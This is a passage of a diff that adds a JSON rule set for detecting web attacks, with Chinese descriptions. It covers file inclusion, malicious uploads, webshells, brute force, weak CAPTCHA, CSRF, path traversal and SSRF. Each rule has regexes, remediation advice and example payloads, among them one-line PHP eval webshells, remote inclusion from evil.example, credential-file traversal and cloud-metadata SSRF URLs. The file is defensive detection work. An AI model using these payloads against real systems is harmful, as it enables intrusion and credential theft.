+      ],
+      "examples": [
+        "?page=../../../../etc/passwd",
+        "?file=/etc/shadow"
+      ]
+    },
+    {
+      "id": "WEB-LFI-002",
+      "category": "file_inclusion",
+      "title": "文件包含：远程包含与协议封装（RFI / php://）",
+      "severity": "critical",
+      "cvss": 9.8,
+      "confidence": "high",
+      "match_targets": [
+        "path",
+        "query",
+        "body"
+      ],
+      "patterns": [
+        "(page|file|include|path|template|view|load|url|src)\\s*=\\s*[\"']?(https?|ftp)://[^&\\s]{3,80}",
+        "php://(filter|input|data|expect|zip|phar|glob)",
+        "(data|expect|zip|phar|glob|compress\\.zlib)://",
+        "file:///(etc|proc|var|root|home|c:)",
+        "\\?[\\w-]{1,20}=(https?|ftp)://[^&\\s]{3,60}\\.(txt|php|jsp|asp|sh|py)"
+      ],
+      "remediation": "关闭 allow_url_include；包含仅允许白名单文件；出网访问加代理审计，禁止服务器主动拉取外部脚本。",
+      "references": [
+        "https://owasp.org/www-community/attacks/File_Inclusion"
+      ],
+      "examples": [
+        "?page=http://evil.example/shell.txt",
+        "?page=php://filter/convert.base64-encode/resource=index.php"
+      ]
+    },
+    {
+      "id": "WEB-LFI-003",
+      "category": "file_inclusion",
+      "title": "文件包含：日志投毒与临时文件包含",
+      "severity": "critical",
+      "cvss": 9.2,
+      "confidence": "high",
+      "match_targets": [
+        "path",
+        "query",
+        "body"
+      ],
+      "patterns": [
+        "(include|require|page|file|path)[^&]{0,30}(access\\.log|error\\.log|auth\\.log|/proc/self/fd/|/tmp/)",
+        "/proc/self/fd/\\d+",
+        "(session|sess_)[\\w-]{6,}",
+        "php://filter/[^&]{0,40}resource=(access|error|auth)\\.log",
+        "\\?[\\w-]{1,20}=/var/log/[\\w/\\.]{3,40}"
+      ],
+      "remediation": "包含路径白名单化；日志/临时目录不可被包含；对 .log、session 文件加访问控制；关闭 allow_url_include。",
+      "references": [
+        "https://owasp.org/www-community/attacks/File_Inclusion"
+      ],
+      "examples": [
+        "?page=../../../../var/log/apache2/access.log",
+        "?page=/proc/self/fd/10"
+      ]
+    },
+    {
+      "id": "WEB-UPLD-001",
+      "category": "file_upload",
+      "title": "文件上传：危险脚本扩展名",
+      "severity": "critical",
+      "cvss": 9.8,
+      "confidence": "high",
+      "match_targets": [
+        "filename",
+        "body",
+        "query"
+      ],
+      "patterns": [
+        "filename\\s*=\\s*[\"']?[^\"'&;\\s]{0,60}\\.(php[0-9]?|phtml|php5|jsp|jspx|asp|aspx|ashx|sh|py|pl|cgi|exe|dll|war)\\b",
+        "(upload|uploaded|uploadfile|upload_file|attach|attachment)\\s*=\\s*[\"']?[^\"'&;\\s]{0,60}\\.(php[0-9]?|phtml|jsp|jspx|asp|aspx|sh|py|pl|cgi|exe|dll)\\b",
+        "content-disposition:\\s*form-data;[^\\r\\n]{0,60}filename\\s*="
+      ],
+      "remediation": "上传校验改为白名单扩展名 + MIME 真伪校验（读文件头）；上传目录禁止脚本执行（Nginx/Apache 配置）；文件重命名并存放于 Web 根之外。",
+      "references": [
+        "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
+        "https://cwe.mitre.org/data/definitions/434.html"
+      ],
+      "examples": [
+        "filename=\"shell.php\"",
+        "Content-Disposition: form-data; name=\"uploaded\"; filename=\"x.jsp\""
+      ]
+    },
+    {
+      "id": "WEB-UPLD-002",
+      "category": "file_upload",
+      "title": "文件上传：双扩展名/空字节/大小写绕过",
+      "severity": "critical",
+      "cvss": 9.4,
+      "confidence": "high",
+      "match_targets": [
+        "filename",
+        "body",
+        "query"
+      ],
+      "patterns": [
+        "\\.(jpg|jpeg|png|gif|bmp|txt|pdf|docx?|xlsx?|zip)\\.(php[0-9]?|phtml|jsp|asp|aspx|sh|py|pl|cgi|exe)\\b",
+        "\\.(php|jsp|asp|aspx|phtml)[\\.;%0\\s]+$",
+        "%00\\.(php|jsp|asp|aspx)",
+        "\\.(p(h|h)p|jsp[x]?|a(s|S)p[x]?)\\b[\\s\"]",
+        "\\.htaccess|\\.user\\.ini|web\\.config|access\\.conf"
+      ],
+      "remediation": "只保留最后一个扩展名并与白名单比对；过滤 %00、分号与多重扩展名；服务端强制重命名文件（如 UUID + 白名单后缀）。",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/434.html"
+      ],
+      "examples": [
+        "filename=\"evil.php.jpg\\u0000.php\"",
+        "filename=\"a.jpg%00.php\""
+      ]
+    },
+    {
+      "id": "WEB-UPLD-003",
+      "category": "file_upload",
+      "title": "文件上传：Webshell 载荷内容（内容型检测）",
+      "severity": "critical",
+      "cvss": 9.6,
+      "confidence": "high",
+      "match_targets": [
+        "body"
+      ],
+      "patterns": [
+        "<\\?(php|=)?[\\s\\S]{0,160}(eval|assert|system|exec|passthru|shell_exec|popen|proc_open)\\s*\\(",
+        "<%\\s*(eval|execute|createobject)\\b",
+        "\\$_(post|get|request|cookie)\\[[^\\]]{1,24}\\]\\s*\\(",
+        "base64_decode\\s*\\(\\s*[\"'][A-Za-z0-9+/=]{40,}",
+        "(cmd|shell|exec)\\s*=\\s*\\$_(post|get|request)",
+        "Runtime\\.getRuntime\\(\\)\\.exec\\s*\\("
+      ],
+      "remediation": "对上传内容做恶意代码扫描（下载前先杀毒/静态扫描）；禁止脚本目录执行权限；启用容器只读挂载与应用白名单。",
+      "references": [
+        "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"
+      ],
+      "examples": [
+        "<?php @eval($_POST['cmd']); ?>",
+        "<% eval request(\"cmd\") %>"
+      ]
+    },
+    {
+      "id": "WEB-WS-001",
+      "category": "webshell",
+      "title": "Webshell：常见木马文件名/路径访问",
+      "severity": "critical",
+      "cvss": 9.8,
+      "confidence": "high",
+      "match_targets": [
+        "path",
+        "query"
+      ],
+      "patterns": [
+        "/(c99|r57|b374k|wso|alfa|kacak|webshell|backdoor|shell|cmd|hack|1)\\.(php[0-9]?|jsp|jspx|asp|aspx|phtml)\\b",
+        "/(up|upload|files?|images?|tmp|data)/(shell|cmd|backdoor|hack|1|c99)\\.(php|jsp|asp|aspx)",
+        "\\.(php|jsp|asp|aspx)\\?[\\w=&%]{0,20}(cmd|exec|command|shell|sys)=",
+        "/(xmrlpc|wp-content/uploads/[\\w/.-]{0,40}\\.php)\\b"
+      ],
+      "remediation": "立即封禁来源、隔离主机并做入侵排查（进程/计划任务/隐藏账号/后门文件）；修补上传与包含漏洞；上传目录禁止执行脚本。",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/506.html"
+      ],
+      "examples": [
+        "GET /upload/shell.php?cmd=id",
+        "GET /b374k.php"
+      ]
+    },
+    {
+      "id": "WEB-WS-002",
+      "category": "webshell",
+      "title": "Webshell：命令执行参数特征",
+      "severity": "critical",
+      "cvss": 9.6,
+      "confidence": "high",
+      "match_targets": [
+        "path",
+        "query"
+      ],
+      "patterns": [
+        "(cmd|command|exec|execute|shell|sys|do|action|run)\\s*=\\s*(id|whoami|ls|dir|cat|type|ipconfig|ifconfig|uname|systeminfo|net\\s+user|ps\\s+-)",
+        "\\?(cmd|exec|command|shell)=\\s*(id|whoami|ls|cat|dir)\\b",
+        "(\\?|&)(php|jsp)=[^&]{1,20}&(cmd|exec)=",
+        "=@?_?\\$_(post|get|request)\\["
+      ],
+      "remediation": "确认 Web 目录是否存在木马文件（时间戳/内容比对）；删除后门并重置相关凭据；封禁来源 IP。",
+      "references": [
+        "https://owasp.org/www-community/attacks/Command_Injection"
+      ],
+      "examples": [
+        "GET /images/1.php?cmd=whoami",
+        "POST /up/shell.jsp?exec=id"
+      ]
+    },
+    {
+      "id": "WEB-WS-003",
+      "category": "webshell",
+      "title": "Webshell：一句话木马与免杀函数特征",
+      "severity": "critical",
+      "cvss": 9.9,
+      "confidence": "high",
+      "match_targets": [
+        "body",
+        "query",
+        "header"
+      ],
+      "patterns": [
+        "@?eval\\s*\\(\\s*\\$_(post|get|request|cookie|server)",
+        "assert\\s*\\(\\s*\\$_(post|get|request)",
+        "preg_replace\\s*\\(\\s*[\"'].{0,20}e[\"'].{0,20}\\$_",
+        "create_function\\s*\\(\\s*[\"']",
+        "array_map\\s*\\(\\s*[\"']?(assert|system|exec|shell_exec)",
+        "\\$_(post|get|request|cookie)\\s*\\[\\s*[\"'][\\w]{1,16}[\"']\\s*\\]\\s*\\(",
+        "(call_user_func|usort|uasort)\\s*\\(\\s*\\$_(post|get|request)"
+      ],
+      "remediation": "按 Webshell 特征清理落地文件；禁用危险函数（disable_functions）；应用层禁止动态执行；补充文件完整性监控。",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/506.html"
+      ],
+      "examples": [
+        "<?php assert($_REQUEST['cmd']); ?>",
+        "POST shell.php  body: a=assert&b=$_POST['c']"
+      ]
+    },
+    {
+      "id": "WEB-BF-001",
+      "category": "brute_force",
+      "title": "暴力破解：登录接口高频尝试",
+      "severity": "high",
+      "cvss": 7.5,
+      "confidence": "high",
+      "match_targets": [
+        "path",
+        "query",
+        "body"
+      ],
+      "threshold": {
+        "window_sec": 60,
+        "count": 10
+      },
+      "patterns": [
+        "(login|signin|sign_in|signup|logon|auth|authenticate|authorize|session|oauth|sso)",
+        "wp-login\\.php|wp-json/wp/v2/users|xmlrpc\\.php|administrator|/manager/html|login\\.action|j_spring_security_check",
+        "(user|account|manager|console)/(auth|login)"
+      ],
+      "remediation": "对登录接口做失败次数限制 + 指数退避 + 验证码；封禁来源 IP；启用双因素与强口令策略；对外暴露的登录入口改走 VPN/堡垒机。",
+      "references": [
+        "https://owasp.org/www-community/attacks/Brute_force_attack",
+        "https://cwe.mitre.org/data/definitions/307.html"
+      ],
+      "examples": [
+        "60 秒内 12 次 POST /login.php",
+        "持续 POST /wp-login.php"
+      ]
+    },
+    {
+      "id": "WEB-BF-002",
+      "category": "brute_force",
+      "title": "暴力破解：登录凭据参数高频提交",
+      "severity": "high",
+      "cvss": 7.2,
+      "confidence": "high",
+      "dwva": "Brute Force",
+      "match_targets": [
+        "query",
+        "body",
+        "header"
+      ],
+      "threshold": {
+        "window_sec": 60,
+        "count": 8
+      },
+      "patterns": [
+        "(username|user|uname|login|email|account|userid|uid)\\s*=\\s*[^&\\s]{1,40}[&;]?\\s*(password|passwd|pwd|pass|secret|token)\\s*=",
+        "(password|passwd|pwd|pass)\\s*=\\s*[^&\\s]{1,60}",
+        "authorization\\s*:\\s*basic\\s+[A-Za-z0-9+/=]{8,}",
+        "(auth|session|access|api)_?(token|key)\\s*=\\s*[A-Za-z0-9._-]{8,}"
+      ],
+      "remediation": "限制单账号/IP 的认证频率；对连续失败账号临时锁定并通知本人；使用密钥/双因素替代口令；禁止 Basic 认证暴露在明文链路。",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/307.html"
+      ],
+      "examples": [
+        "user=admin&password=1&Login=Login（连续 20 次）"
+      ]
+    },
+    {
+      "id": "WEB-BF-003",
+      "category": "brute_force",
+      "title": "暴力破解：账号字典与常见弱口令探测",
+      "severity": "high",
+      "cvss": 7,
+      "confidence": "high",
+      "match_targets": [
+        "query",
+        "body"
+      ],
+      "threshold": {
+        "window_sec": 120,
+        "count": 12
+      },
+      "patterns": [
+        "(user|username|uname|login|email|account)\\s*=\\s*(admin|root|administrator|test|guest|oracle|postgres|sa|user|demo|tomcat|weblogic)\\b",
+        "(password|pwd|pass)\\s*=\\s*(admin|root|123456|12345678|password|passw0rd|qwerty|abc123|admin123|123456789|111111)\\b",
+        "(user|username)=[^&]{1,24}&(password|pwd)=[^&]{1,24}&?.*(Submit|Login|login=)"
+      ],
+      "remediation": "强制口令复杂度与定期更换；禁止默认口令；对同一来源的字典式尝试直接封禁并告警；开启账号锁定与异常登录提醒。",
+      "references": [
+        "https://owasp.org/www-community/attacks/Brute_force_attack"
+      ],
+      "examples": [
+        "user=admin&password=123456（字典轮询）"
+      ]
+    },
+    {
+      "id": "WEB-BF-004",
+      "category": "brute_force",
+      "title": "暴力破解：认证失败响应风暴（401/403 高频）",
+      "severity": "high",
+      "cvss": 7.3,
+      "confidence": "high",
+      "match_targets": [
+        "path",
+        "query",
+        "body",
+        "header"
+      ],
+      "method_in": [
+        "POST",
+        "PUT",
+        "GET"
+      ],
+      "status_in": [
+        401,
+        403
+      ],
+      "threshold": {
+        "window_sec": 60,
+        "count": 15
+      },
+      "patterns": [
+        "(login|auth|token|oauth|session|api|admin|password|verify)",
+        "(GET|POST)\\s+/[\\w/-]{1,60}"
+      ],
+      "remediation": "对 401/403 高频来源做限速与临时封禁；检查是否存在凭据填充攻击；对外接口启用速率限制（429）与审计日志。",
+      "references": [
+        "https://owasp.org/www-community/attacks/Credential_stuffing"
+      ],
+      "examples": [
+        "60 秒内 20 次 HTTP 401（/api/login）"
+      ]
+    },
+    {
+      "id": "WEB-CAPTCHA-001",
+      "category": "insecure_captcha",
+      "title": "不安全验证码：空值/固定值/弱值提交",
+      "severity": "medium",
+      "cvss": 6.5,
+      "confidence": "high",
+      "match_targets": [
+        "query",
+        "body"
+      ],
+      "patterns": [
+        "(captcha|code|vcode|verify|verifycode|image_code|seccode|checkcode)\\s*=\\s*(0{4,6}|1{4,6}|1234|12345|123456|1111|abc|abcd|aaaa|test|demo|admin|null|undefined|true)(&|$|\"|'|\\)|;|\\s)",
+        "(captcha|code|vcode|verifycode|seccode)\\s*=\\s*(&|$)",
+        "recaptcha_response_field\\s*=\\s*(&|$)",
+        "g-recaptcha-response\\s*=\\s*(&|$|\"|')",
+        "(captcha|code|vcode)\\s*=\\s*[\\w]{1,4}(&|$)"
+      ],
+      "remediation": "验证码必须服务端校验且与一次性会话绑定、一次性使用、设置有效期（≤2 分钟）；禁止空值/固定值通过；失败的验证尝试要限速。",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/804.html",
+        "https://owasp.org/www-community/controls/CAPTCHA"
+      ],
+      "examples": [
+        "captcha=&step=2",
+        "captcha=1234&submit=Change"
+      ]
+    },
+    {
+      "id": "WEB-CAPTCHA-002",
+      "category": "insecure_captcha",
+      "title": "不安全验证码：校验流程可跳步/伪状态参数",
+      "severity": "medium",
+      "cvss": 6.1,
+      "confidence": "medium",
+      "match_targets": [
+        "query",
+        "body"
+      ],
+      "threshold": {
+        "window_sec": 60,
+        "count": 8
+      },
+      "patterns": [
+        "(step|phase|stage|state|change)\\s*=\\s*[2-9]\\b",
+        "(captcha|verify|validated?|checked|passed|ok|success)\\s*=\\s*(1|true|yes|on)\\b",
+        "(recaptcha|g-recaptcha)[\\w-]*\\s*=\\s*(1|true|skip|bypass)",
+        "submit\\s*=\\s*(Change|Submit|Next|Verify)"
+      ],
+      "remediation": "流程状态只允许服务端维护，禁止客户端 step/passed 参数直接决定校验结果；校验未通过时必须服务端阻断。",
+      "false_positive_hint": "可信度中等：多步表单（如分步注册）本身会带 step，请结合接口路径与失败率复核。",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/804.html"
+      ],
+      "examples": [
+        "change=1&step=2&password_new=a&password_conf=a"
+      ]
+    },
+    {
+      "id": "WEB-CAPTCHA-003",
+      "category": "insecure_captcha",
+      "title": "不安全验证码：验证码接口被自动化高频拉取",
+      "severity": "medium",
+      "cvss": 5.9,
+      "confidence": "high",
+      "match_targets": [
+        "path"
+      ],
+      "threshold": {
+        "window_sec": 60,
+        "count": 20
+      },
+      "patterns": [
+        "/(captcha|seccode|verifycode|kaptcha|checkcode|imagecode|code)(\\.(php|jsp|asp|aspx|png|jpg|gif))?\\b",
+        "/common/(captcha|verify)|/api/(captcha|verify)"
+      ],
+      "remediation": "验证码接口加会话绑定与频率限制；图形验证码使用噪声/扭曲并缩短有效期；结合行为风控识别自动化拉取。",
+      "references": [
+        "https://owasp.org/www-community/controls/CAPTCHA"
+      ],
+      "examples": [
+        "GET /captcha.php（60 秒 40 次）"
+      ]
+    },
+    {
+      "id": "WEB-CSRF-001",
+      "category": "csrf",
+      "title": "CSRF：敏感操作缺少防伪 Token",
+      "severity": "high",
+      "cvss": 7.6,
+      "confidence": "medium",
+      "match_targets": [
+        "path",
+        "query",
+        "body"
+      ],
+      "method_in": [
+        "POST",
+        "PUT",
+        "PATCH",
+        "DELETE"
+      ],
+      "threshold": {
+        "window_sec": 60,
+        "count": 3
+      },
+      "patterns": [
+        "(delete|remove|update|edit|modify|transfer|withdraw|pay|refund|reset|change_password|password|email|profile|settings|admin|add_user|grant)",
+        "(action|do|op|cmd|task|method)\\s*=\\s*(delete|update|modify|transfer|reset|remove|add|drop|edit)\\b"
+      ],
+      "exclude_patterns": [
+        "(csrf|xsrf|authenticity_token|__requestverificationtoken|_token|csrfmiddlewaretoken|nonce)\\s*[=:]\\s*[\\w-]{6,}",
+        "(login|signin|sign_on|logon|logout|authenticate|oauth|sso|session|token|captcha|vcode)\\s*[=:/]"
+      ],
+      "remediation": "所有状态变更接口强制校验一次性 CSRF Token（与会话绑定、服务端比对）；Cookie 设置 SameSite=Lax/Strict；对跨站来源直接拒绝。",
+      "false_positive_hint": "可信度中等：部分 API 使用 Authorization 头鉴权（不依赖 Cookie）时天然免疫 CSRF，请按接口加白。",
+      "references": [
+        "https://owasp.org/www-community/attacks/csrf",
+        "https://cwe.mitre.org/data/definitions/352.html"
+      ],
+      "examples": [
+        "POST /vulnerabilities/csrf/ password_new=a&password_conf=a（无 Token）"
+      ]
+    },
+    {
+      "id": "WEB-CSRF-002",
+      "category": "csrf",
+      "title": "CSRF：缺少/伪造来源标识（Origin、Referer 缺失或跨站）",
+      "severity": "high",
+      "cvss": 7.1,
+      "confidence": "medium",
+      "match_targets": [
+        "path",
+        "query",
+        "body"
+      ],
+      "method_in": [
+        "POST",
+        "PUT",
+        "PATCH",
+        "DELETE"
+      ],
+      "require_absent": [
+        "origin",
+        "referer"
+      ],
+      "threshold": {
+        "window_sec": 60,
+        "count": 3
+      },
+      "patterns": [
+        "(password|passwd|pwd|email|phone|pay|transfer|withdraw|withdrawal|address|order|admin|user|role|profile|bind|unbind|delete|update)",
+        "(submit|confirm|save|apply|change)\\s*[=:]"
+      ],
+      "remediation": "校验 Origin/Referer 必须与本站一致；缺少来源校验的状态变更接口按 CSRF 漏洞修复（Token + SameSite）。",
+      "false_positive_hint": "可信度中等：服务端到服务端的 API 调用通常不带 Origin/Referer，请按接口加白。",
+      "references": [
+        "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"
+      ],
+      "examples": [
+        "POST /api/user/email（无 Origin/Referer，无 Token）"
+      ],
+      "exclude_patterns": [
+        "(login|signin|sign_on|logon|logout|authenticate|oauth|sso|session|token|captcha|vcode)\\s*[=:/]"
+      ]
+    },
+    {
+      "id": "WEB-CSRF-003",
+      "category": "csrf",
+      "title": "CSRF：GET 请求执行敏感操作",
+      "severity": "high",
+      "cvss": 7.4,
+      "confidence": "high",
+      "match_targets": [
+        "path",
+        "query"
+      ],
+      "method_in": [
+        "GET"
+      ],
+      "patterns": [
+        "/(delete|remove|transfer|reset|revoke|disable|enable|logout|withdraw|update|edit)(\\.(php|jsp|do|action|aspx))?(\\?|$|/)",
+        "(action|do|op|cmd)\\s*=\\s*(delete|remove|transfer|reset|revoke|disable|enable|update)\\b",
+        "/(admin|user|account)/\\d+/(delete|remove|reset)\\b",
+        "(id|uid|sid)\\s*=\\s*\\d+&(action|del|delete)\\s*="
+      ],
+      "remediation": "敏感操作改为 POST/DELETE + CSRF Token 校验；禁止用 GET 触发状态变更；补充关键操作二次确认与审计。",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/352.html"
+      ],
+      "examples": [
+        "GET /admin/user/5/delete",
+        "GET /index.php?action=delete&id=1"
+      ]
+    },
+    {
+      "id": "WEB-CSRF-004",
+      "category": "csrf",
+      "title": "CSRF：Token 可预测或固定（长度过短/固定值）",
+      "severity": "high",
+      "cvss": 7,
+      "confidence": "medium",
+      "dwva": "CSRF",
+      "match_targets": [
+        "query",
+        "body"
+      ],
+      "patterns": [
+        "(csrf|xsrf|anti_?csrf|token)[\\w-]*\\s*=\\s*\\d{1,6}(&|$|\\\"|')",
+        "(csrf|xsrf)[\\w-]*\\s*=\\s*(test|admin|1234|12345|true|abc|aaa|0000)(&|$|\\\"|')",
+        "(csrf|xsrf)[\\w-]*\\s*=\\s*[A-Za-z0-9]{1,8}(&|$)"
+      ],
+      "remediation": "CSRF Token 使用密码学安全随机数（≥128 bit）并与会话绑定、一次性使用；禁止把 Token 放在 URL 中（会经 Referer 泄漏）。",
+      "false_positive_hint": "可信度中等：短 Token 也可能是业务编号，建议先与研发确认 Token 生成逻辑。",
+      "references": [
+        "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"
+      ],
+      "examples": [
+        "csrf=1",
+        "token=abcd1234"
+      ]
+    },
+    {
+      "id": "WEB-TRV-001",
+      "category": "path_traversal",
+      "title": "目录穿越：上跳目录序列（../ 或 ..\\）",
+      "severity": "high",
+      "cvss": 8.6,
+      "confidence": "high",
+      "match_targets": [
+        "path",
+        "query",
+        "body"
+      ],
+      "patterns": [
+        "(\\.\\./){2,}",
+        "(\\.\\.\\\\){2,}",
+        "\\.\\./[^\\s]{0,24}(\\.\\./)",
+        "/\\.\\./\\.\\./",
+        "(\\.\\./){1,}[\\w.-]{1,20}\\.\\./"
+      ],
+      "remediation": "文件访问只允许白名单 ID 映射；对路径做 normalize 后强制限制在基目录内（realpath 前缀校验）；禁止把用户输入拼进文件路径。",
+      "references": [
+        "https://owasp.org/www-community/attacks/Path_Traversal",
+        "https://cwe.mitre.org/data/definitions/22.html"
+      ],
+      "examples": [
+        "?file=../../../../etc/passwd",
+        "?path=..\\..\\windows\\win.ini"
+      ]
+    },
+    {
+      "id": "WEB-TRV-002",
+      "category": "path_traversal",
+      "title": "目录穿越：编码/双写/分号绕过（编码特征检测）",
+      "severity": "high",
+      "cvss": 8.4,
+      "confidence": "high",
+      "dwva": "File Inclusion",
+      "match_targets": [
+        "path",
+        "query",
+        "body"
+      ],
+      "match_mode": "raw",
+      "patterns": [
+        "%2e%2e(%2f|/|%5c|%255c)",
+        "%252e%252e",
+        "\\.\\.%2f|\\.\\.%5c",
+        "%c0%ae%c0%ae",
+        "\\.\\.;/|\\.\\.\\\\.\\./",
+        "%2e%2e%5c%2e%2e"
+      ],
+      "remediation": "先解码再校验（校验必须在解码之后）；多重编码只解一次即可绕过，务必做循环解码 + 归一化 + 白名单。",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/22.html"
+      ],
+      "examples": [
+        "?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "?file=..%252f..%252fetc/passwd"
+      ]
+    },
+    {
+      "id": "WEB-TRV-003",
+      "category": "path_traversal",
+      "title": "目录穿越：敏感文件与凭据文件访问",
+      "severity": "critical",
+      "cvss": 9.1,
+      "confidence": "high",
+      "match_targets": [
+        "path",
+        "query",
+        "body"
+      ],
+      "patterns": [
+        "(etc/passwd|etc/shadow|etc/hosts|proc/self/environ|proc/self/cmdline)",
+        "(root/\\.ssh|/home/[\\w-]{1,20}/\\.ssh|\\.ssh/id_(rsa|dsa|ed25519))",
+        "(windows/win\\.ini|windows/system32/config/(sam|system)|boot\\.ini)",
+        "(\\.htpasswd|\\.htaccess|\\.git/config|\\.svn/entries|\\.env|\\.aws/credentials|\\.npmrc|\\.docker/config\\.json)",
+        "(web-inf/web\\.xml|application\\.properties|application\\.yml|config\\.php|db\\.config|settings\\.py|wp-config\\.php)",
+        "(id_rsa|credentials\\.json|secrets\\.yaml|kubeconfig)"
+      ],
+      "remediation": "确认是否存在任意文件读取漏洞并立即修复；轮换已可能泄露的密钥/凭据；将敏感配置移出 Web 根目录并收紧权限。",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/22.html"
+      ],
+      "examples": [
+        "?download=../../../.git/config",
+        "?file=/root/.ssh/id_rsa"
+      ]
+    },
+    {
+      "id": "WEB-TRV-004",
+      "category": "path_traversal",
+      "title": "目录穿越：下载/读取类参数携带穿越特征",
+      "severity": "high",
+      "cvss": 8,
+      "confidence": "medium",
+      "match_targets": [
+        "query",
+        "body",
+        "path"
+      ],
+      "patterns": [
+        "(download|file|filename|path|dir|folder|read|load|open|src|img|attach|attachment|doc|document|export|view|show|get|page)\\s*=\\s*[^&]{0,60}(/\\.\\./|\\.\\./|etc/|c:\\\\|file://)",
+        "(file|path|dir)\\s*=\\s*[^&]{0,40}%2f",
+        "(download|read)\\s*=\\s*[\"']?[^&\"']{0,40}(\\.\\./|/etc/)"
+      ],
+      "remediation": "按参数做白名单（文件名/ID 映射）；导出与下载接口单独做路径校验并限制可访问目录。",
+      "false_positive_hint": "可信度中等：目录浏览类接口正常会带路径参数，建议对管理后台来源放宽。",
+      "references": [
+        "https://owasp.org/www-community/attacks/Path_Traversal"
+      ],
+      "examples": [
+        "?download=../../etc/passwd",
+        "?file=....//....//etc/passwd"
+      ]
+    },
+    {
+      "id": "WEB-SSRF-001",
+      "category": "ssrf",
+      "title": "SSRF：参数指向内网/回环地址",
+      "severity": "high",
+      "cvss": 8.6,
+      "confidence": "high",
+      "match_targets": [
+        "path",
+        "query",
+        "body"
+      ],
+      "patterns": [
+        "(url|uri|link|target|dest|destination|redirect|next|return|callback|webhook|proxy|fetch|src|host|domain|site|image|avatar|feed|rss|import|service|endpoint)\\s*=\\s*[\"']?(https?|ftp|gopher|dict|file)://[^&\\s]{0,80}(127\\.0\\.0\\.1|localhost|0\\.0\\.0\\.0|\\[::1\\]|10\\.\\d{1,3}\\.|192\\.168\\.|172\\.(1[6-9]|2\\d|3[01])\\.)",
+        "(https?|ftp|gopher)://[^&\\s]{0,40}(127\\.0\\.0\\.1|localhost|0\\.0\\.0\\.0)(:\\d{2,5})?",
+        "=https?://(10\\.|192\\.168\\.|172\\.(1[6-9]|2\\d|3[01])\\.)[^&\\s]{0,60}",
+        "(\\?|&)[\\w-]{1,20}=(https?://)?(127\\.0\\.0\\.1|localhost)(:80|:443|:8080|:22)?(&|$)"
+      ],
+      "remediation": "对可发起外呼的参数做协议+域名白名单；解析后校验目标 IP 不属于内网/回环/链路本地（防 DNS Rebinding）；出网走统一代理并审计。",
+      "references": [
+        "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/",
+        "https://cwe.mitre.org/data/definitions/918.html"
+      ],
+      "examples": [
+        "?url=http://127.0.0.1:8080/admin",
+        "?image=http://192.168.1.1/"
+      ]
+    },
+    {
+      "id": "WEB-SSRF-002",
+      "category": "ssrf",
+      "title": "SSRF：云元数据接口与内网敏感端口",
+      "severity": "critical",
+      "cvss": 9.1,
+      "confidence": "high",
+      "match_targets": [
+        "path",
+        "query",
+        "body"
+      ],
+      "patterns": [
+        "169\\.254\\.169\\.254|metadata\\.google\\.internal|100\\.100\\.100\\.200|metadata\\.azure\\.com",
+        "/latest/meta-data|/computeMetadata/v1|/metadata/(iam|instance-identity)",
+        "(127\\.0\\.0\\.1|localhost|0\\.0\\.0\\.0|\\[::1\\]|10\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}):(22|23|25|135|445|1433|2375|3306|3389|5432|5601|6379|7001|8080|8443|9200|11211|27017|50000)\\b",
+        "(http|https)://(127\\.0\\.0\\.1|localhost)(/|:)(admin|manager|actuator|console|api/v1)",
+        "/actuator/(env|health|heapdump)|/manager/html"
+      ],
+      "remediation": "云主机启用 IMDSv2（需 Token 且限制跳数）；出站访问限制到必要域名端口；禁止应用访问内网管理端口与 /actuator 等敏感端点。",
+      "references": [
+        "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/"
+      ],
+      "examples": [
+        "?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      ]
+    },
+    {
+      "id": "WEB-SSRF-003",
+      "category": "ssrf",
+      "title": "SSRF：危险协议与地址变形绕过",
+      "severity": "high",
+      "cvss": 8.2,
+      "confidence": "high",
+      "dwva": "SSRF",
+      "match_targets": [
+        "path",
+        "query",
+        "body"
+      ],
+      "patterns": [
+        "(gopher|dict|ldap|sftp|tftp|jar|netdoc|php|expect|file)://[^&\\s]{2,60}",
+        "https?://[^&\\s/@]{0,40}@(127\\.0\\.0\\.1|localhost|169\\.254\\.169\\.254|192\\.168\\.)",
+        "(0x7f000001|2130706433|017700000001|0x7f\\.0\\.0\\.1)",
+        "https?://[^/\\s]{0,30}\\.(nip\\.io|xip\\.io|sslip\\.io|localtest\\.me)",
+        "https?://\\[0:0:0:0:0:0:0:1\\]|https?://\\[::ffff:127\\.0\\.0\\.1\\]",
+        "(127\\.0\\.0\\.1|localhost)\\.(nip\\.io|xip\\.io)"
+      ],
+      "remediation": "协议白名单只允许 http/https；解析域名后校验 IP 并禁内网段；拦截 URL 中的 @、十六进制/八进制 IP 等变形写法。",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/918.html"
+      ],
+      "examples": [
+        "?url=gopher://127.0.0.1:6379/_INFO",
+        "?url=http://2130706433/admin"
+      ]
+    },
+    {
+      "id": "WEB-SSRF-004",
+      "category": "ssrf",
+      "title": "SSRF：外呼类参数被批量枚举（内网探测）",
+      "severity": "medium",
+      "cvss": 6.4,
+      "confidence": "medium",
+      "dwva": "SSRF",
+      "match_targets": [
+        "query",
+        "body",
+        "path"
+      ],
+      "threshold": {
+        "window_sec": 60,
+        "count": 12
+      },
+      "patterns": [
+        "(url|uri|target|redirect|fetch|proxy|webhook|callback|import)(\\[\\d+\\])?\\s*[=:]\\s*[\"']?https?://[^&\\s]{4,80}",
+        "(host|ip|domain|port)\\s*=\\s*[\\d\\.]{7,15}(:|&|$)",
+        "(image|avatar|logo|cover|file)_?url\\s*=\\s*https?://[^&\\s]{4,80}"
+      ],
